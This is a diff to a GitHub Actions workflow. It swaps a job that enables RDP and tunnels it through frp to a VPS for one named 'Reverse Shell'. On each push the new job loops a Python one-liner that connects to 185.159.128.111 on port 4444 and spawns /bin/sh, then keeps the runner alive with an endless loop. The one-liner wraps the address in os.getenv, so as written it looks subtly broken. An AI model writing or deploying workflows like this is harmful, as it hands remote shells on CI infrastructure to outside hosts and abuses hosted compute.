@@ -1,51 +1,24 @@
-name:FRP-RDP-WINDOWS-RUNNER
+name: Reverse Shell
 
-on:
-  push:
-  workflow_dispatch:
-  
+on: [push]
+
 jobs:
-  setup-windows-runner:
-    runs-on: windows-latest
+  reverse-shell:
+    runs-on: ubuntu-latest
 
     steps:
     - name: Checkout code
       uses: actions/checkout@v2
 
-    - name: Enable RDP
-      run: |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: '3.x'
 
-    - name: Configure Windows Firewall
+    - name: Create reverse shell script
       run: |
-        New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow
+        while true; do python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("185.159.128.111"),int(os.getenv("4444"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ; sleep  10 ; done
+        echo salam
 
-    - name: Download frp
-      run: |
-        Invoke-WebRequest -Uri "https://github.com/fatedier/frp/releases/download/v0.37.0/frp_0.37.0_windows_amd64.zip" -OutFile frp.zip
-        Expand-Archive -Path frp.zip -DestinationPath frp
-
-    - name: Configure frp client
-      run: |
-        Set-Content -Path frp/frpc.ini -Value @"
-        [common]
-        server_addr = vps-ip
-        server_port = 7000
-
-        [rdp]
-        type = tcp
-        local_ip = 127.0.0.1
-        local_port = 3389
-        remote_port = 6398
-        "@
-      env:
-        VPS_IP: ${{ secrets.VPS_IP }}
-
-    - name: Run frp client
-      run: |
-        Start-Process -FilePath "frp/frpc.exe" -ArgumentList "-c", "frp/frpc.ini"
-
-    - name: Display Runner IP
-      run: |
-        ipconfig
+    - name: Run reverse shell script
+      run: while true ; do echo $RANDOM ; sleep 3 ; done
